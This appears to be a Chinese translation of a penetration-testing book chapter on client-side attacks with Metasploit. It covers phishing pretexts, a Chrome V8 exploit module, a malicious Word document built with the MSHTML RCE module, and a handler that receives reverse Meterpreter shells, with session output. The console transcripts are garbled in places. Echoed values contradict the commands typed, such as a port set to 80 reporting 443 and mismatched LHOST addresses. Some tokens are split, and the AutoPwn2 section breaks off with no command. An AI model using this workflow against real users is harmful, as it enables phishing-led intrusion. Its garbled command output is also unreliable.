# 第9章：客户端攻击

多年来对网络防御的专注大幅压缩了传统的攻击面。当某条途径变得过于难以突破时，攻击者必须寻找新的、更复杂的方法。随着网络防御的提升，客户端攻击也在不断演进。Metasploit 包含多个内置的客户端利用模块，针对计算机上常见安装的软件，如网页浏览器、PDF阅读器和 Microsoft Office 应用程序。

这些利用通常需要首先绕过公司的防护措施，例如诱骗用户点击恶意链接。假设你正在进行一次针对企业目标的隐蔽渗透测试，使用社会工程学手段。你决定向员工发送钓鱼邮件，因此你需要收集电子邮件账户、姓名和电话号码来创建目标列表。你的邮件指示收件人点击一个（恶意）链接以更新他们的工资信息。一旦用户点击该链接，他们的机器就被攻陷，你就可以访问组织的内部网络。

你会发现在渗透测试和真实攻击中经常出现这种场景。欺骗用户通常比利用网络的公共资源更容易。大多数组织投入大量资金使用入侵防御系统（IPS）和 Web 应用防火墙等工具保护其面向互联网的系统，却忽视了对用户进行社会工程学攻击（诱骗用户泄露信息或提供未授权访问）的教育。

例如，2020年，一名攻击者通过鱼叉式钓鱼攻击入侵了 Twitter（现为 X）。鱼叉式钓鱼攻击不是随机从公司地址簿中选择用户，而是针对攻击者精心挑选并深入研究过的用户。在这次攻击中，攻击者通过诱使 Twitter 员工登录一个伪造的 Twitter 内部 VPN 版本，窃取了他们的凭据。一旦攻击者获得访问权限，他们就能够从前总统和商业领袖的账户发送推文。

## 基于浏览器的利用

让我们首先关注 Metasploit 中基于浏览器的利用。这些很重要，因为在许多组织中，用户使用网页浏览器的时间比其他任何应用程序都多。

考虑以下场景：我们向组织中的一小部分人发送一封电子邮件，其中包含一个每个用户都会点击的链接。当用户点击链接时，他们的浏览器会向我们的网站发出请求，该网站包含一个专门为该浏览器设计的零日漏洞，并向浏览器进程中注入一个 Meterpreter payload。现在，通过运行在访问网站的浏览器上下文中的 payload，我们获得了对用户底层系统的访问。

注意这个例子中的一个关键要素：如果目标用户以管理员身份运行，那么攻击者也将拥有管理员权限。客户端利用通常以与目标相同的权限和权利运行。通常，这没有管理员权限，所以有时我们可能需要进行权限提升攻击，使用进一步的利用来获得更多访问权限。我们也可以攻击网络上的其他系统，希望获得管理员级别的访问。然而，在其他情况下，当前用户的权限级别就足够了。想一想你的系统：你的重要数据是通过用户账户可访问的，还是仅管理员账户可访问？

所有这些并不意味着浏览器利用很容易。浏览器极其复杂，由多个部分和进程组成，包括 JavaScript 引擎、DOM 解析器和沙箱。有时攻击者需要利用其中几个部分才能获得访问权限。这通常通过链式利用完成；例如，攻击者可能首先利用 JavaScript 引擎，然后使用另一个利用来逃逸浏览器沙箱。

此外，防御者通常很快会修补浏览器漏洞，因此在本节中，我们将关注三件事：如何在 Metasploit 框架中搜索最新的浏览器漏洞，如何使用 Metasploit 的 Autopwn2 模块自动化浏览器利用过程，以及如何找到仍在生产版本软件中存在的浏览器漏洞。

## 在 Metasploit 中查找漏洞

让我们开始搜索最新的浏览器漏洞。使用 MSFconsole 的 search 命令，并按当前或最近年份过滤结果。例如，如果你在 2060 年阅读这本书，请将 `<year>` 替换为 2059 或 2060：

```sh
msf > search browser date:<year>

Matching Modules
===============
   #  Name
   -  ----
   0  exploit/multi/browser/chrome...  manual  No   e Chrome versions...
   1  exploit/windows/fileformat...    excellent No   soft Office Word...
   2  exploit/osx/browser...           manual  No   macOS Gatekeeper...
```

如果你想针对 Google Chrome 浏览器，你会使用第一个漏洞；如果想针对 Safari，则使用第三个。让我们以 Chrome 漏洞为例，演示如何设置和运行浏览器漏洞。输入 `use` 关键字，后跟漏洞的索引，以选择模块：

```sh
msf > use 0
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
...multi/browser/chrome... > options

Module options (exploit/multi/browser/chrome...):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SRVHOST    0.0.0.0          yes       The local interface to listen o...
   SRVPORT    8080             yes       The local port to lis ten on
   SSL        false            no        Negotiate SSL for ince oming conn...
   SSLCert                     no        Path to a custom SSL certificat...
   URIPATH                     no        The URI to use for th is exploit...

Payload options (linux/x64/meterpreter/reverse_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.40.128   yes       The listen address...
   LPORT  4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Linux - Google Chrome < 89.0.4389.128/90.0.4430.72 (64 bit)

...multi/browser/chrome...) > set SRVPORT 80
SRVPORT => 443
...multi/browser/chrome...) > set URIPATH /
```

首先，注意 SRVHOST 的默认设置为 0.0.0.0：这意味着 Web 服务器将绑定到所有接口。SRVPORT 为 8080，是目标用户需要连接以触发漏洞的端口。我们将使用端口 80 而不是 8080。但请记住，这会使我们的链接看起来有些可疑，因为 http://192.168.40.128:80 等同于 http://192.168.40.128（浏览器默认添加 HTTP 端口 80）。

更隐蔽的方法是使用托管域名和端口 443，例如：https://www.cs.virginia.edu。注意该链接没有显式包含端口 443，因为它是 HTTPS 的默认端口。你也可以将恶意代码注入网络数据包或现有网站中。

URIPATH 是用户需要输入以触发漏洞的 URL，我们将其设置为斜杠（/）。让我们运行漏洞：

```sh
msf ...(multi/browser/chrome...) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf exploit (multi/browser/chrome...) > 
[*] Started reverse TCP handler on 192.168.40.128:4444
[*] Using URL: http://0.0.0.0:80/
[*] Local IP: http://192.168.40.128:80/
[*] Server started.
```

需要注意的是，这个漏洞有其局限性。它不包含逃逸 Chrome 沙箱的能力。这意味着只有当用户在禁用沙箱的易受攻击版本的 Chrome 浏览器中打开链接时，它才有效。如果你在模块上运行 `info` 命令，你会看到如下说明：

```log
Description:
  This module exploits an issue in the V8 engine on x86_x64 builds
  of Google Chrome before 89.0.4389.128/90.0.4430.72 when handling XOR
  operations in JIT'd JavaScript code. Successful exploitation allows an
  attacker to execute arbitrary code within the context of the V8 process.
  As the V8 process is normally sandboxed in the default configuration of
  Google Chrome, the browser must be run with the --no-sandbox option for
  the payload to work correctly.
```

这个例子突出了浏览器利用的复杂性，以及攻击者通常需要多个漏洞才能访问机器的事实。此漏洞已被修补，并且没有公开披露的沙箱逃逸漏洞能与之配合。可想而知，发现浏览器漏洞需要毅力和创造力，因此研究人员找到它们时令人印象深刻。

## 使用 AutoPwn2 自动化利用

在前面的例子中，我们事先知道需要利用的浏览器的名称和版本。然而，你并不总是知道目标会使用什么浏览器版本来打开链接。AutoPwn2 模块试图通过尝试多个漏洞来自动化浏览器利用过程，希望访问链接的浏览器容易受到其中某个漏洞的攻击。运行以下命令以选择 AutoPwn2：


## 寻找更新的漏洞

Exploit-DB 是查找最新浏览器漏洞的绝佳资源。然而，许多与这些漏洞相关的错误在被添加到该数据库之前可能已经被修补。如果你想找到可以在生产环境浏览器上利用的漏洞，可以查看即将发布的版本中正在修复的问题，以及 Beta 版本中正在修复的常见漏洞与暴露（CVE）：这些是当前应用程序生产版本中存在的错误。

你也可以尝试发现新的（零日）浏览器漏洞。然而，这个过程需要大量的投入和创造力。过去，基于语法的模糊测试器帮助攻击者发现浏览器漏洞。许多开发浏览器的大型公司甚至在内部运行此类模糊测试工具以尽早发现缺陷。我们将在第 14 章讨论模糊测试以及如何开发你自己的 Metasploit 利用模块。

## 文件格式漏洞

文件格式漏洞是在文件阅读器（如 Adobe PDF 阅读器）中发现的可利用漏洞。这类利用依赖于用户在易受攻击的应用程序中打开恶意文件。这些恶意文件可以远程托管或通过电子邮件发送。我们在本章开头简要提到了利用文件格式漏洞作为鱼叉式钓鱼攻击，第 8 章提供了更多关于鱼叉式钓鱼的信息。

## 利用 Word 文档

文件格式漏洞可以被任何你认为目标容易受到攻击的文件利用，无论是 Microsoft Word 文档、PDF、图像还是其他文件类型。在这个例子中，我们将看一个案例研究：Microsoft Windows MSHTML 浏览器引擎中的一个远程代码执行漏洞，该漏洞可以利用 Word 文档进行利用。

虽然此漏洞已被修补，但它为如何设置和运行文件格式模块提供了一个很好的例子。你可以使用 `search` 命令过滤当前年份来找到其他更新、更相关的文件格式漏洞：

```sh
msf > search fileformat date:<year>

===============
```

第一步是通过 MSFconsole 访问我们的漏洞。输入 `use` 选择漏洞，然后输入 `options` 查看可用选项。在下一个示例中，你可以看到文件格式导出为文档：

像往常一样，我们需要设置一个 payload。在这种情况下，我们将选择首选的反向 Meterpreter shell：

```sh
msf exploit (exploit/windows/fileformat/word_mshtml_rce) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit (exploit/windows/fileformat/word_mshtml_rce) > set LHOST 10.0.1.45

```

我们的文件被导出为 `msf.doc`。现在我们有了恶意文档，可以制作一封电子邮件发送给目标，希望用户打开它。

## 发送 Payload

此时，我们应该已经对目标的补丁级别和漏洞有所了解。在用户打开文档之前，我们需要设置一个多处理程序监听器。这将确保当漏洞被触发时，攻击者的机器能够接收来自加载到目标机器上的反向 shell 的连接：

```sh
msf exploit(exploit/windows/fileformat/word_mshtml_rce) > us e exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/rever se_tcp
msf exploit (handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit (handler) > set LHOST 10.0.1.15
LHOST => 172.16.32.128
msf exploit (handler) > set LPORT 443
LPORT => 443
msf exploit (handler) > exploit -j
[*] Exploit running as background job
[*] Started reverse handler on 10.0.1.45:443
[*] Starting the payload handler...
msf exploit (handler) >
```

如果我们在 Windows 虚拟机上尝试打开该文档，只要虚拟机运行的是易受攻击的 Word 版本，我们应该会得到一个 shell：

```sh
msf exploit (handler) > 
[*] Sending stage (749056 bytes) to 10.0.1.12
[*] Meterpreter session 1 opened (10.0.1.45:443 -> 10.0.1.12:2718)
msf exploit (handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter >
```

我们通过 Metasploit 创建恶意文档，然后将其发送给用户，成功利用了文件格式漏洞。在真实攻击中，如果我们对目标进行了充分的侦察，很可能能够制作出令人信服的电子邮件。这个漏洞只是 Metasploit 中可用的几个文件格式漏洞中的一个例子。

## 总结

我们通过重点关注两类漏洞：浏览器漏洞和文件格式漏洞，介绍了客户端攻击的一般工作原理。请注意，这类攻击的成功取决于你在尝试执行攻击之前获取了多少关于目标的信息。（手上有几个零日漏洞也会有很大帮助。）

作为一名渗透测试人员，你可以利用每一点信息来策划更出色的攻击。在鱼叉式钓鱼中，如果你针对公司内部非技术性质的小型业务单元，成功的机会会大大增加。只要你做好功课，浏览器漏洞和文件格式漏洞通常非常有效。
